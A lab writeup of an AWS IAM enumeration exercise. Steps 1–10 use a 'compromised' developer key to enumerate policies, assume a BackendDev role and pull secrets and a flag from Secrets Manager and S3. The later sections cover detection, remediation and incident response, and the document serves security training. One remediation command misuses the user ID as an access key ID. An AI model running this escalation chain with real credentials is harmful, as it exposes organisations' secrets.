# Intro to AWS IAM Enumeration — PwnedLabs Writeup
**Author:** Jashwanth | **Platform:** PwnedLabs | **Difficulty:** Beginner  
**Tags:** `AWS` `IAM` `Enumeration` `AssumeRole` `Secrets Manager` `GuardDuty` `Privilege Escalation`  
**Lab URL:** https://pwnedlabs.io/labs/intro-to-aws-iam-enumeration

---

> ⚠️ **Disclaimer:** This writeup is for educational purposes only. All commands were executed inside a sanctioned lab environment. Never use these techniques against systems you don't own or have explicit written permission to test.

---

## Table of Contents
1. [Scenario](#1-scenario)
2. [IAM Concepts — Quick Reference](#2-iam-concepts--quick-reference)
3. [Tools Used](#3-tools-used)
4. [Attack Path — Step by Step](#4-attack-path--step-by-step)
5. [Blue Team — How to Detect This Attack](#5-blue-team--how-to-detect-this-attack)
6. [Root Cause Analysis](#6-root-cause-analysis)
7. [Remediation](#7-remediation)
8. [Real-World Playbook — If This Happens at Your Company](#8-real-world-playbook--if-this-happens-at-your-company)
9. [Real-World Breach Connection](#9-real-world-breach-connection)
10. [Key Takeaways](#10-key-takeaways)
11. [References](#11-references)

---

## 1. Scenario

**Company:** Huge Logistics (fictional)  
**Our Role:** Security Consultant  
**Entry Point:** AWS access key ID + secret access key for IAM user `dev01` (provided — simulates a compromised/phished developer credential)  
**Mission:** Enumerate the IAM user `dev01`, map all permissions, identify the blast radius of this compromised account, discover accessible roles and services, and retrieve the flag

**In plain English:**  
A developer's credentials were compromised. We've been handed those credentials and asked: *"What could an attacker do with these?"* This lab is about methodically mapping every permission, every role, and every service reachable from a single IAM user — the exact process a real attacker uses before escalating.

**Attack Chain at a Glance:**
```
[Configure Credentials] → [Identity Verification] → [User Enumeration]
    → [Group Enumeration] → [Attached Policy Enumeration] → [Inline Policy Enumeration]
        → [Policy Version Analysis] → [Role Discovery] → [AssumeRole → BackendDev]
            → [Secrets Manager Access] → [Flag Retrieved] 
```

---

## 2. IAM Concepts — Quick Reference

Before the attack path, here's a cheat sheet of the IAM building blocks you'll encounter. Bookmark this — it applies to every AWS engagement.

| Concept | What It Is | Why It Matters in Attacks |
|---------|-----------|--------------------------|
| **IAM User** | A human or service identity with long-term credentials | Stolen user creds = persistent access until rotated |
| **IAM Group** | A collection of users sharing the same permissions | Misconfigured groups can grant unintended access to all members |
| **IAM Role** | A temporary identity that can be assumed by users/services | `AssumeRole` is the #1 privilege escalation vector in AWS |
| **Inline Policy** | Permission document embedded directly into a user/role | Hard to audit centrally — attackers look for these |
| **Managed Policy (AWS)** | Pre-built policy by AWS (e.g., `AmazonGuardDutyReadOnlyAccess`) | Broad permissions — always enumerate what AWS policies are attached |
| **Managed Policy (Customer)** | Policy you create and attach to multiple users/roles | Versioned — older versions may have more permissive access |
| **Policy Version** | Historical snapshot of a managed policy | Attackers check all versions — an old version may have more permissions |
| **Blast Radius** | All resources a compromised identity can reach | The core question in IAM enumeration: what's the damage if this user is compromised? |

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| AWS Management Console | Initial exploration, GuardDuty inspection |
| `aws configure` | Set up credentials for the `dev01` user |
| `aws sts get-caller-identity` | Confirm active identity ("AWS whoami") |
| `aws iam get-user` | Get detailed info on the IAM user |
| `aws iam list-groups-for-user` | Check group memberships |
| `aws iam list-attached-user-policies` | Find managed policies attached to the user |
| `aws iam list-user-policies` | Find inline policies on the user |
| `aws iam get-user-policy` | Read the inline policy document |
| `aws iam get-policy` | Get metadata about a managed policy |
| `aws iam list-policy-versions` | List all versions of a managed policy |
| `aws iam get-policy-version` | Read a specific policy version's permissions |
| `aws iam list-attached-role-policies` | Find policies attached to a role |
| `aws iam get-role` | Read role details including trust policy |
| `aws sts assume-role` | Escalate by assuming the BackendDev role |
| `aws secretsmanager list-secrets` | Enumerate secrets in Secrets Manager |
| `aws secretsmanager get-secret-value` | Retrieve the actual secret value |

---

## 4. Attack Path — Step by Step

### Step 1 — Configure Credentials and Verify Identity

```bash
# Configure AWS CLI with the provided dev01 credentials
aws configure --profile lab
# AWS Access Key ID: [provided]
# AWS Secret Access Key: [provided]
# Default region: us-east-1
# Output format: json
```

**Verify who we are:**
```bash
aws sts get-caller-identity --profile lab
```

**Output:**
```json
{
  "UserId": "AIDA3SFMDAPOWFB7BSGME",
  "Account": "794929857501",
  "Arn": "arn:aws:iam::794929857501:user/dev01"
}
```

>  Always run `get-caller-identity` first. This is the AWS equivalent of `whoami`. It confirms credentials are valid, reveals the account ID (useful for building ARNs later), and tells you the exact IAM identity you're operating as.

---

### Step 2 — AWS Management Console Exploration

Logged into the console via:
```
https://794929857501.signin.aws.amazon.com/console
```

>  The AWS account ID is embedded in the console login URL. Always note it — you'll need it for building ARNs and constructing API calls.

**Explored GuardDuty** (under Security, Identity & Compliance, region `us-west-1`):  
GuardDuty is AWS's threat detection service. As `dev01`, we have `AmazonGuardDutyReadOnlyAccess` — this is interesting from a red team perspective because an attacker with GuardDuty read access can see exactly what GuardDuty is monitoring and what it has *not* detected.

---

### Step 3 — Enumerate the IAM User in Detail

```bash
aws iam get-user --profile lab
```

**Output:**
```json
{
  "User": {
    "Path": "/",
    "UserName": "dev01",
    "UserId": "AIDA3SFMDAPOWFB7BSGME",
    "Arn": "arn:aws:iam::794929857501:user/dev01",
    "CreateDate": "2023-09-28T21:56:31+00:00",
    "PasswordLastUsed": "2025-05-30T11:46:55+00:00",
    "Tags": [
      {
        "Key": "AKIA3SFMDAPOWC2NR5LO",
        "Value": "dev01"
      }
    ]
  }
}
```

>  **Finding:** The tag `Key` contains what looks like an AWS Access Key ID (`AKIA...`). This is a developer accidentally storing an access key as a tag — another potential credential to investigate.

---

### Step 4 — Enumerate Group Memberships

```bash
aws iam list-groups-for-user --user-name dev01 --profile lab
```

**Output:**
```json
{
  "Groups": []
}
```

`dev01` is not a member of any IAM group. This means all permissions come directly from attached or inline policies — move on to enumerate those.

---

### Step 5 — Enumerate Attached (Managed) Policies

```bash
aws iam list-attached-user-policies --user-name dev01 --profile lab
```

**Output:**
```json
{
  "AttachedPolicies": [
    {
      "PolicyName": "AmazonGuardDutyReadOnlyAccess",
      "PolicyArn": "arn:aws:iam::aws:policy/AmazonGuardDutyReadOnlyAccess"
    },
    {
      "PolicyName": "dev01",
      "PolicyArn": "arn:aws:iam::794929857501:policy/dev01"
    }
  ]
}
```

**Two managed policies found:**
- `AmazonGuardDutyReadOnlyAccess` — AWS-managed, grants read-only GuardDuty access
- `dev01` — Customer-managed policy, likely custom-built for this user — highest priority to enumerate

---

### Step 6 — Analyze the Customer-Managed Policy `dev01`

First, get the policy metadata to find the current version:

```bash
aws iam get-policy \
  --policy-arn arn:aws:iam::794929857501:policy/dev01 \
  --profile lab
```

**Output shows:** Current version is `v7`

List all historical versions:

```bash
aws iam list-policy-versions \
  --policy-arn arn:aws:iam::794929857501:policy/dev01 \
  --profile lab
```

>  Always list all versions of a customer-managed policy. Older versions are sometimes more permissive — developers sometimes accidentally publish a policy with broad access, realise, then tighten it. But old versions remain and could still be set as default.

Now read the actual permissions in `v7`:

```bash
aws iam get-policy-version \
  --policy-arn arn:aws:iam::794929857501:policy/dev01 \
  --version-id v7 \
  --profile lab
```

**What this policy grants `dev01`:**
- `iam:GetUser` — read own user details
- `iam:ListGroupsForUser` — check group memberships
- `iam:ListAttachedUserPolicies` — list own attached policies
- `iam:GetRole` on `BackendDev` role — read the BackendDev role details
- `iam:ListAttachedRolePolicies` on `BackendDev` — list policies on BackendDev
- `iam:GetPolicy` + `iam:GetPolicyVersion` on `BackendDevPolicy` — read the BackendDev policy
- `iam:GetPolicy` on `AmazonGuardDutyReadOnlyAccess` — read the GuardDuty policy details

>  **Key Finding:** `dev01` has explicit permissions to enumerate the `BackendDev` role. This is a trail the policy itself is pointing us toward — the attacker's next step is clear.

---

### Step 7 — Enumerate the Inline Policy

```bash
aws iam list-user-policies --user-name dev01 --profile lab
```

**Output:**
```json
{
  "PolicyNames": ["S3_Access"]
}
```

One inline policy found. Read it:

```bash
aws iam get-user-policy \
  --user-name dev01 \
  --policy-name S3_Access \
  --profile lab
```

**What `S3_Access` grants:**
- `s3:ListBucket` on `hl-dev-artifacts`
- `s3:GetObject` on `hl-dev-artifacts/*`

Verify by listing the bucket:

```bash
aws s3 ls s3://hl-dev-artifacts --profile lab
```

**Output:**
```
2023-10-xx  xx:xx:xx    32  flag.txt
... (other dev artifacts)
```

>  A file named `flag.txt` in a development artifacts bucket is immediately suspicious. However, we note this and continue — the real objective is to fully enumerate before acting.

---

### Step 8 — Enumerate the BackendDev Role

Get role details:

```bash
aws iam get-role --role-name BackendDev --profile lab
```

**Output (key section — Trust Policy):**
```json
{
  "Role": {
    "RoleName": "BackendDev",
    "Arn": "arn:aws:iam::794929857501:role/BackendDev",
    "Description": "Allows developers to assume this role",
    "AssumeRolePolicyDocument": {
      "Statement": [{
        "Effect": "Allow",
        "Principal": {
          "AWS": "arn:aws:iam::794929857501:user/dev01"
        },
        "Action": "sts:AssumeRole"
      }]
    }
  }
}
```

>  **Critical Finding:** The trust policy explicitly allows `dev01` to assume the `BackendDev` role. This is the privilege escalation path.

List the policies attached to `BackendDev`:

```bash
aws iam list-attached-role-policies --role-name BackendDev --profile lab
```

**Output:** `BackendDevPolicy` attached

Read `BackendDevPolicy`:

```bash
aws iam get-policy \
  --policy-arn arn:aws:iam::794929857501:policy/BackendDevPolicy \
  --profile lab

aws iam get-policy-version \
  --policy-arn arn:aws:iam::794929857501:policy/BackendDevPolicy \
  --version-id v1 \
  --profile lab
```

**What `BackendDevPolicy` grants (when `BackendDev` role is assumed):**
- `secretsmanager:ListSecrets` — enumerate all secrets
- `secretsmanager:GetSecretValue` — read actual secret values

>  **Full Picture:** If we assume `BackendDev`, we get access to AWS Secrets Manager. That's where the flag lives.

---

### Step 9 — Assume the BackendDev Role (Privilege Escalation)

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::794929857501:role/BackendDev \
  --role-session-name MySession \
  --profile lab
```

**Output:**
```json
{
  "Credentials": {
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "...",
    "SessionToken": "...",
    "Expiration": "2023-xx-xxTxx:xx:xxZ"
  }
}
```

Configure CLI with the temporary credentials:

```bash
aws configure set aws_access_key_id "ASIA..." --profile backend
aws configure set aws_secret_access_key "..." --profile backend
aws configure set aws_session_token "..." --profile backend
```

**Verify the new identity:**
```bash
aws sts get-caller-identity --profile backend
```

**Output:**
```json
{
  "Arn": "arn:aws:sts::794929857501:assumed-role/BackendDev/MySession"
}
```

We are now operating as `BackendDev`. Privilege escalation complete.

---

### Step 10 — Access Secrets Manager and Retrieve the Flag

```bash
aws secretsmanager list-secrets --profile backend
```

**Output:** One or more secrets listed, including the target secret.

```bash
aws secretsmanager get-secret-value \
  --secret-id [secret-name-from-list] \
  --profile backend
```

**Flag retrieved.** 

Also, the S3 bucket access from Step 7:

```bash
aws s3 cp s3://hl-dev-artifacts/flag.txt . --profile lab
cat flag.txt
# FLAG: [captured] 
```

---

## 5. Blue Team — How to Detect This Attack

### Detection Signal 1 — Systematic IAM Self-Enumeration

A normal developer doesn't run 10+ IAM API calls in 5 minutes. An attacker enumerating permissions does.

```bash
# CloudTrail filter — look for rapid IAM enumeration by single user
grep '"eventSource": "iam.amazonaws.com"' cloudtrail.json | \
  grep "dev01" | \
  jq '.eventTime + " " + .eventName' | \
  sort
```

**Alert rule:** More than 5 distinct IAM read actions (`GetUser`, `ListGroups`, `ListPolicies`, `GetPolicy`, `GetPolicyVersion`) from a single user within 2 minutes → trigger investigation.

### Detection Signal 2 — Policy Version Enumeration

Listing old policy versions is almost never done by normal developers. It's an attacker looking for over-permissive historical versions.

```bash
grep '"eventName": "ListPolicyVersions"' cloudtrail.json
grep '"eventName": "GetPolicyVersion"' cloudtrail.json | grep -v '"versionId": "v[0-9]*"' # checking older versions
```

**Alert rule:** `ListPolicyVersions` + `GetPolicyVersion` for a non-default version from the same user within 10 minutes → flag for review.

### Detection Signal 3 — AssumeRole from a Developer User

```bash
grep '"eventName": "AssumeRole"' cloudtrail.json | grep "dev01"
```

In most organizations, developers don't manually call `sts:AssumeRole` from the CLI. This is typically automated via CI/CD or done by services.

**Alert rule:** `AssumeRole` event from any `dev*` user → alert the security team immediately.

### Detection Signal 4 — Secrets Manager Access from an Assumed Role

```bash
grep '"eventSource": "secretsmanager.amazonaws.com"' cloudtrail.json | \
  grep "BackendDev"
```

**Alert rule:** `GetSecretValue` from an assumed-role session that was previously a developer account → high severity alert.

### Detection Signal 5 — GuardDuty Read Access Used

An attacker with GuardDuty read access will look at findings to understand what security monitoring is in place. This shows up in CloudTrail:

```bash
grep '"eventSource": "guardduty.amazonaws.com"' cloudtrail.json | grep "dev01"
```

**Alert rule:** Any GuardDuty enumeration from a developer account (not a security team account) → investigate intent.

---

## 6. Root Cause Analysis

| # | Root Cause | Severity |
|---|-----------|---------|
| 1 | `dev01` policy explicitly grants `iam:GetRole` and `iam:ListAttachedRolePolicies` on `BackendDev` — effectively a roadmap to privilege escalation |   Critical |
| 2 | Trust policy of `BackendDev` role allows `dev01` to assume it without MFA or condition checks |   Critical |
| 3 | `BackendDev` role grants `secretsmanager:GetSecretValue` — production secrets accessible via role assumption from a developer account |   Critical |
| 4 | `dev01` has `AmazonGuardDutyReadOnlyAccess` — attacker can audit what GuardDuty is and isn't detecting |   High |
| 5 | AWS access key stored as an IAM tag on `dev01` — credential misplacement |   High |
| 6 | Inline policy (`S3_Access`) grants access to `hl-dev-artifacts` bucket including `flag.txt` — sensitive files in dev buckets |   High |
| 7 | No MFA condition required before `sts:AssumeRole` is permitted |   High |
| 8 | No CloudWatch alarm on `AssumeRole` events from developer accounts |   Medium |
| 9 | No automated IAM Access Analyzer to detect overly permissive policies |   Medium |

---

## 7. Remediation

### Immediate (within 1 hour of detection)

```bash
# 1. Rotate dev01 credentials immediately
aws iam delete-access-key --user-name dev01 --access-key-id AKIA3SFMDAPOWFB7BSGME
aws iam create-access-key --user-name dev01

# 2. Revoke any active BackendDev sessions
# Add an explicit Deny to the role temporarily
aws iam put-role-policy \
  --role-name BackendDev \
  --policy-name EmergencyDeny \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{"Effect": "Deny", "Action": "*", "Resource": "*"}]
  }'

# 3. Check all secrets accessed in the last 24h
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=GetSecretValue \
  --start-time $(date -d '24 hours ago' +%s)

# 4. Remove the access key accidentally stored as a tag
aws iam untag-user --user-name dev01 --tag-keys "AKIA3SFMDAPOWC2NR5LO"
```

### Short-Term (within 24 hours)

**Fix the `dev01` policy — remove IAM enumeration permissions on BackendDev:**
```json
// REMOVE these from dev01's customer-managed policy:
{
  "Effect": "Allow",
  "Action": [
    "iam:GetRole",
    "iam:ListAttachedRolePolicies",
    "iam:GetPolicy",
    "iam:GetPolicyVersion"
  ],
  "Resource": "arn:aws:iam::794929857501:role/BackendDev"
}
// Developers should not be able to enumerate the roles they can escalate to
```

**Require MFA before AssumeRole:**
```json
// Update the BackendDev trust policy
{
  "Effect": "Allow",
  "Principal": {
    "AWS": "arn:aws:iam::794929857501:user/dev01"
  },
  "Action": "sts:AssumeRole",
  "Condition": {
    "Bool": {
      "aws:MultiFactorAuthPresent": "true"
    }
  }
}
```

**Remove GuardDuty read access from the developer account:**
```bash
aws iam detach-user-policy \
  --user-name dev01 \
  --policy-arn arn:aws:iam::aws:policy/AmazonGuardDutyReadOnlyAccess
```

**Move sensitive files out of developer-accessible S3 buckets:**
```bash
# Move flag.txt and any production-adjacent files to a restricted bucket
aws s3 mv s3://hl-dev-artifacts/flag.txt s3://hl-secure-artifacts/flag.txt
# Apply strict bucket policy on hl-secure-artifacts allowing only production roles
```

### Long-Term (within 1 week)

**Enable IAM Access Analyzer:**
```bash
aws accessanalyzer create-analyzer \
  --analyzer-name "huge-logistics-analyzer" \
  --type ACCOUNT
# This automatically flags overly permissive policies and public-facing resources
```

**Set up CloudWatch alarm for AssumeRole from developer accounts:**
```bash
aws cloudwatch put-metric-alarm \
  --alarm-name "DevAssumeRoleAlert" \
  --alarm-description "Developer account used AssumeRole" \
  --metric-name "AssumeRoleFromDevAccount" \
  --namespace "CloudTrailMetrics" \
  --statistic Sum \
  --period 300 \
  --threshold 1 \
  --comparison-operator GreaterThanOrEqualToThreshold \
  --evaluation-periods 1 \
  --alarm-actions "arn:aws:sns:us-east-1:794929857501:SecurityAlerts"
```

**Enforce least privilege with IAM Access Advisor:**
```bash
# Find which services dev01 actually uses vs what they have access to
aws iam generate-service-last-accessed-details --arn arn:aws:iam::794929857501:user/dev01
aws iam get-service-last-accessed-details --job-id [job-id]
# Remove permissions for services not accessed in the last 90 days
```

**Implement AWS Organizations SCPs to block developer accounts from assuming admin roles:**
```json
{
  "Effect": "Deny",
  "Action": "sts:AssumeRole",
  "Resource": "arn:aws:iam::*:role/Admin*",
  "Condition": {
    "StringLike": {
      "aws:PrincipalArn": "arn:aws:iam::*:user/dev*"
    }
  }
}
```

---

## 8. Real-World Playbook — If This Happens at Your Company

> Your production incident response guide. If a pager fires with "possible developer credential compromise" — follow this.

### Detection Triggers (What Should Alert You)

| Signal | Source | Urgency |
|--------|--------|---------|
| 5+ IAM read API calls from a developer account in <2 min | CloudTrail + CloudWatch |   Immediate |
| `ListPolicyVersions` from a non-automation account | CloudTrail |   Immediate |
| `AssumeRole` from a developer IAM user | CloudTrail |   Immediate |
| `GetSecretValue` from an assumed-role session linked to a dev account | CloudTrail |   Immediate |
| `GetCallerIdentity` from an IP not in known developer IP ranges | CloudTrail |   Immediate |
| IAM Access Analyzer finding — overly permissive AssumeRole trust | IAM Access Analyzer |   High |
| Developer account accessing GuardDuty API | CloudTrail |   Medium |

### Incident Response Steps (Production)

```
1. IDENTIFY  → Confirm the compromised user via CloudTrail GetCallerIdentity events
2. SCOPE     → List ALL API calls made by dev01 in the last 30 days
               aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=dev01
3. CONTAIN   → Rotate credentials, attach DenyAll policy to the user
4. REVOKE    → Revoke any active assumed-role sessions
5. ASSESS    → Did they reach Secrets Manager? What secrets? Were those secrets used externally?
6. PRESERVE  → Lock CloudTrail logs (S3 Object Lock) for forensic integrity
7. NOTIFY    → If secrets contained DB credentials or API keys, rotate ALL of them
8. REMEDIATE → Fix IAM policies, remove unnecessary permissions, require MFA for AssumeRole
9. HARDEN    → Enable IAM Access Analyzer, set CloudWatch alarms, conduct IAM audit
10. REVIEW   → Document the attack path, update developer security training
```

### Key AWS CLI Commands for Real IAM IR

```bash
# Get EVERYTHING a user has done in the last 7 days
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=Username,AttributeValue=dev01 \
  --start-time $(date -d '7 days ago' +%s) \
  --query 'Events[*].[EventTime,EventName,SourceIPAddress]' \
  --output table

# Find all AssumeRole events in last 24h
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
  --start-time $(date -d '24 hours ago' +%s)

# Find all GetSecretValue calls in the last 30 days
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=GetSecretValue \
  --start-time $(date -d '30 days ago' +%s)

# List all access keys for a user and their status
aws iam list-access-keys --user-name dev01

# Get last service access for a user (IAM Access Advisor)
aws iam generate-service-last-accessed-details \
  --arn arn:aws:iam::794929857501:user/dev01

# Check if IAM Access Analyzer has any existing findings
aws accessanalyzer list-findings --analyzer-name huge-logistics-analyzer

# List all roles that a specific user can assume (check trust policies)
aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument.Statement[].Principal.AWS, `arn:aws:iam::794929857501:user/dev01`)]'

# Emergency: Deny all access to a compromised user
aws iam put-user-policy \
  --user-name dev01 \
  --policy-name EMERGENCY_DENY_ALL \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Action":"*","Resource":"*"}]}'
```

---

## 9. Real-World Breach Connection

**This is the exact attack pattern used in countless real-world cloud breaches:**

**Uber (2022)** — An attacker compromised a contractor's credentials and used them to enumerate IAM permissions, find accessible roles, and escalate privileges across multiple internal systems. The enumeration phase looked exactly like what we did in this lab.

**Codecov (2021)** — Attackers exfiltrated environment variables (including AWS credentials) from CI/CD pipelines. Once they had IAM credentials, they enumerated permissions to understand blast radius — same methodology.

**Tesla (2018)** — Attackers compromised an AWS account with developer credentials, found an IAM misconfiguration, and escalated access to cryptocurrency mine on Tesla's infrastructure using assumed roles.

**The common thread:** In all these cases, the attacker had credentials → enumerated IAM → found an assumable role → escalated to higher privilege. This is why IAM enumeration is the **most foundational skill** in AWS red teaming.

> 🔗 **MITRE ATT&CK Mapping:**
> - T1078.004 — Valid Accounts: Cloud Accounts
> - T1087.004 — Account Discovery: Cloud Account
> - T1548 — Abuse Elevation Control Mechanism
> - T1098 — Account Manipulation

---

## 10. Key Takeaways

| # | Lesson | Apply Where |
|---|--------|------------|
| 1 | Always run `get-caller-identity` first — understand your context before anything else | Every AWS engagement |
| 2 | Enumerate in order: user → groups → attached policies → inline policies → roles → policy versions | IAM enumeration methodology |
| 3 | Check ALL policy versions — older versions may be more permissive than the current one | Policy analysis |
| 4 | If a policy grants `iam:GetRole` on a specific role, that's a pointer — enumerate that role immediately | Kill chain development |
| 5 | Trust policies on roles define exactly who can escalate — always read them | Privilege escalation |
| 6 | `sts:AssumeRole` without MFA condition = privilege escalation waiting to happen | IAM hardening |
| 7 | GuardDuty read access on a developer account = attacker can see your blind spots | Defensive posture |
| 8 | Tags can contain accidentally stored credentials — always check them | User enumeration |
| 9 | IAM Access Analyzer is the most underused AWS security tool — enable it on every account | Long-term hardening |
| 10 | "Blast radius" thinking = the #1 mental model for IAM security — always ask "what's the worst-case from this identity?" | Every cloud security assessment |

---

## 11. References

- [AWS IAM Documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/introduction.html)
- [AWS STS AssumeRole](https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html)
- [AWS IAM Access Analyzer](https://docs.aws.amazon.com/IAM/latest/UserGuide/what-is-access-analyzer.html)
- [AWS Secrets Manager](https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html)
- [AWS GuardDuty](https://docs.aws.amazon.com/guardduty/latest/ug/what-is-guardduty.html)
- [MITRE ATT&CK — Account Discovery: Cloud Account (T1087.004)](https://attack.mitre.org/techniques/T1087/004/)
- [MITRE ATT&CK — Valid Accounts: Cloud Accounts (T1078.004)](https://attack.mitre.org/techniques/T1078/004/)
- [Rhino Security Labs — AWS IAM Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [PwnedLabs — Intro to AWS IAM Enumeration](https://pwnedlabs.io/labs/intro-to-aws-iam-enumeration)

---

by Jashwanth | [GitHub](https://github.com/JashwanthMU) | Part of the `aws-cloud-security-labs` writeup series*
